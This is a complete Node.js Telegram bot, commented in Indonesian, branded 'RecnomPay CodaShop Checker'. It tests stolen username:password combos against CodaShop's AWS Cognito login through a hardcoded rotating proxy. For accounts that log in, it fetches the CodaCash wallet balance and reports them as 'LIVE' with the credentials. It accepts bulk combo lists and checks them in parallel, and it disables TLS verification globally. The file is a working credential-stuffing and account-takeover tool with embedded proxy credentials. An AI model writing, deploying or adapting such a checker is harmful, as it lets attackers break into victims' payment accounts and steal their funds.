// Paksa matikan verifikasi SSL secara global agar proxy tidak terblokir
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Inisialisasi Bot dengan Token dari Environment Variable Vercel
const bot = new Telegraf(process.env.BOT_TOKEN);

// Inisialisasi Proxy
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823');

// ==========================================
// FUNGSI INTI PENGECEKAN API
// ==========================================
async function checkAccount(username, password) {
  try {
    const authPayload = JSON.stringify({
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    });

    const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      httpsAgent: proxyAgent,
      validateStatus: () => true,
      timeout: 15000
    });

    const resData = authReq.data;

    // Jika Login Berhasil (LIVE)
    if (resData && resData.AuthenticationResult) {
      const idToken = resData.AuthenticationResult.IdToken;

      const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        httpsAgent: proxyAgent,
        validateStatus: () => true,
        timeout: 10000
      });

      const balance = walletReq.data?.data?.balanceAmount || 0;
      return { status: 'live', balance: balance, msg: 'Success' };
    } else {
      // Jika Login Gagal (DIE)
      const msg = resData?.__type ? resData.__type.replace('Exception', '') : 'Invalid Credentials';
      return { status: 'die', msg: msg };
    }
  } catch (error) {
    return { status: 'error', msg: 'Proxy Error/Timeout' };
  }
}

// ==========================================
// HANDLER: /START & MENU BANTUAN
// ==========================================
bot.start((ctx) => {
  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n🔹 Cek Satuan: Ketik /codashop email:pass\n🔹 Cek Massal: Langsung kirim/upload file .txt ke bot ini.');
});

// ==========================================
// HANDLER: /CODASHOP (Cek Satuan)
// ==========================================
bot.command('codashop', async (ctx) => {
  const args = ctx.message.text.split(' ');
  
  if (args.length < 2) {
    return ctx.reply('❌ <b>Format Salah!</b>\n\nUntuk cek satuan silakan gunakan format:\n<code>/codashop username:password</code>\n\nAtau jika ingin cek secara massal, <b>kamu cukup langsung upload file .txt</b> ke chat ini. Bot akan otomatis memprosesnya!', { parse_mode: 'HTML' });
  }

  const combo = args[1].replace(/[|;\s]/g, ':').split(':');
  if (combo.length < 2) return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');

  const username = combo[0].trim();
  const password = combo[1].trim();

  const loadingMsg = await ctx.reply('⏳ <i>RecnomPay Checker sedang memproses...</i>', { parse_mode: 'HTML' });

  const result = await checkAccount(username, password);

  if (result.status === 'live') {
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `✅ <b>LIVE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nBalance: <b>${result.balance}</b>\n━━━━━━━━━━━━━━━━━━\n🤖 <i>RecnomPay Checker</i>`,
      { parse_mode: 'HTML' }
    );
  } else {
    const icon = result.status === 'die' ? '❌ <b>DIE ACCOUNT</b>' : '⚠️ <b>ERROR ACCOUNT</b>';
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `${icon}\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: ${result.msg}\n━━━━━━━━━━━━━━━━━━`,
      { parse_mode: 'HTML' }
    );
  }
});

// ==========================================
// HANDLER: UPLOAD FILE .TXT (Mass Check Unlimited)
// ==========================================
bot.on('document', async (ctx) => {
  const doc = ctx.message.document;
  
  // Validasi agar hanya memproses file .txt
  if (!doc.file_name.endsWith('.txt')) {
    return ctx.reply('❌ Mohon kirim file dengan format .txt yang berisi list combo.');
  }

  const loadingMsg = await ctx.reply('📥 <i>File diterima! Mengunduh dan memulai Mass Check...</i>\n\n⚠️ <i>Proses massal ini berpacu dengan batas waktu server 10 detik. Jika data terlalu banyak, hasil mungkin tidak muncul.</i>', { parse_mode: 'HTML' });

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const response = await axios.get(fileLink.href);
    const textData = response.data;

    // Ambil SEMUA baris tanpa batas (Unlimited)
    const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
    if (lines.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Tidak ada format combo yang valid di dalam file.');
    }

    let liveResult = '';
    let liveCount = 0;
    let dieCount = 0;

    // Proses semua akun secara paralel agar super cepat
    const checkPromises = lines.map(async (line) => {
      const combo = line.replace(/[|;\s]/g, ':').split(':');
      if (combo.length >= 2) {
        const username = combo[0].trim();
        const password = combo[1].trim();
        const res = await checkAccount(username, password);
        return { username, password, res };
      }
      return null;
    });

    // Menunggu hasil
    const results = await Promise.all(checkPromises);

    // Rekap Data
    results.forEach(item => {
      if (item && item.res.status === 'live') {
        liveCount++;
        liveResult += `<code>${item.username}:${item.password}</code> | Bal: <b>${item.res.balance}</b>\n`;
      } else if (item) {
        dieCount++;
      }
    });

    // Format Pesan Telegram (Mencegah error limit 4096 karakter dari Telegram)
    let finalMsg = `<b>✅ REKAP MASS CHECKING</b>\n━━━━━━━━━━━━━━━━━━\n`;
    if (liveCount > 0) {
      if (liveResult.length > 3000) {
        finalMsg += liveResult.substring(0, 3000) + `\n... <i>(Hasil dipotong karena limit teks Telegram)</i>\n`;
      } else {
        finalMsg += liveResult;
      }
    } else {
      finalMsg += `<i>Tidak ada akun yang Live.</i>\n`;
    }
    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${lines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;

    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, finalMsg, { parse_mode: 'HTML' });

  } catch (error) {
    console.error(error);
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Gagal memproses file.\nKemungkinan: File terlalu besar, Proxy mati, atau terkena Timeout Vercel (10 detik).');
  }
});

// ==========================================
// HANDLER: VERCEL SERVERLESS FUNCTION
// ==========================================
module.exports = async (req, res) => {
  try {
    if (req.method === 'POST') {
      await bot.handleUpdate(req.body, res);
    } else {
      res.status(200).send('RecnomPay Bot berjalan dengan baik!');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Terjadi kesalahan pada server');
  }
};
